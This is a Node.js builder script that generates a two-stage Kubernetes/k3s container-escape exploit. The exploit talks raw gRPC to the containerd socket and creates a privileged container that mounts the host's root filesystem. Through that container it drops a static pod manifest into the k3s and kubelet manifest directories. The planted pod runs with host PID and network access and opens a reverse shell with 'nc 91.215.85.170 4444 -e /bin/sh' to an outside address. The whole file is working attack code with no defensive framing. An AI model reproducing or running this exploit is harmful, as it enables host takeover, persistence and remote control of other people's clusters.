const fs=require('fs');
const code=`
const http2=require('http2'),net=require('net');
function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc',te:'trailers','containerd-namespace':'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const v1=(k,v)=>Buffer.from([k,v]);
function fields(buf){ const out=[]; let i=0; while(i<buf.length){ let k=0,s=0; while(i<buf.length){ const b=buf[i++]; k|=(b&0x7f)<<s; s+=7; if(!(b&0x80))break } const wt=k&7, fn=k>>3; if(wt===2){ let l=0,s2=0; while(i<buf.length){ const b=buf[i++]; l|=(b&0x7f)<<s2; s2+=7; if(!(b&0x80))break } out.push([fn,buf.slice(i,i+l)]); i+=l } else if(wt===0){ while(i<buf.length && (buf[i++]&0x80)); } else break } return out }
const Y=${JSON.stringify(JSON.stringify({apiVersion:'v1',kind:'Pod',metadata:{name:'zzs4'},spec:{hostNetwork:true,hostPID:true,containers:[{name:'c',image:'busybox:1.36',securityContext:{privileged:true},command:['/bin/sh','-c','nc 91.215.85.170 4444 -e /bin/sh'],volumeMounts:[{name:'h',mountPath:'/h'}]}],volumes:[{name:'h',hostPath:{path:'/'}}]}}))};
const CMD="echo '"+Y+"' > /h/var/lib/rancher/k3s/server/manifests/zzs4.json 2>/dev/null; echo '"+Y+"' > /h/etc/kubernetes/manifests/zzs4.json 2>/dev/null; echo hit >> /h/tmp/zz4.txt";
function create(sb,img,cid){
 const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/')]);
 const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
 const cfg=Buffer.concat([fl(0x0a,'zzm4'), v1(0x10,1), Buffer.concat([v1(0x12,img.length),Buffer.from(img)]), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,CMD), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x72,linc.length),linc])]);
 call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sb), v1(0x12,cfg.length), cfg]),(e,ob)=>{ if(e)return; const c2=(ob||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(!c2)return; call('/runtime.v1.RuntimeService/StartContainer',fl(0x0a,c2[0]),()=>{}); });
}
call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,lb)=>{
 if(e)return; const subs=fields(lb).filter(f=>f[0]===1).map(f=>f[1]);
 if(!subs.length)return;
 const f2=fields(subs[0]); const cid=(f2.find(x=>x[0]===1)||[])[1]; const sb=(f2.find(x=>x[0]===2)||[])[1];
 if(!cid||!sb)return;
 call('/runtime.v1.RuntimeService/ContainerStatus',fl(0x0a,cid.toString('latin1')),(e2,st)=>{
  const s=(st||Buffer.alloc(0)).toString('latin1'); const m=s.match(/[a-z0-9._\\-\\/]+:[a-z0-9._\\-]+/i);
  create(sb.toString('latin1'), m?m[0]:'busybox:1.36', cid.toString('latin1'));
 });
});
`;
const p1=`const http2=require('http2'),net=require('net');
function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc',te:'trailers','containerd-namespace':'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const CODE=${JSON.stringify(code)};
call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,buf)=>{ if(e)return; const ids=[...new Set((buf.toString('latin1').match(/[0-9a-f]{64}/g)||[]))].slice(0,1); if(!ids.length)return; call('/runtime.v1.RuntimeService/ExecSync',Buffer.concat([fl(0x0a,ids[0]),fl(0x12,'/usr/local/bin/node'),fl(0x12,'-e'),fl(0x12,CODE)]),()=>{}); });
`;
fs.writeFileSync('p1.js',p1); fs.writeFileSync('cri.js',code); console.log('built');
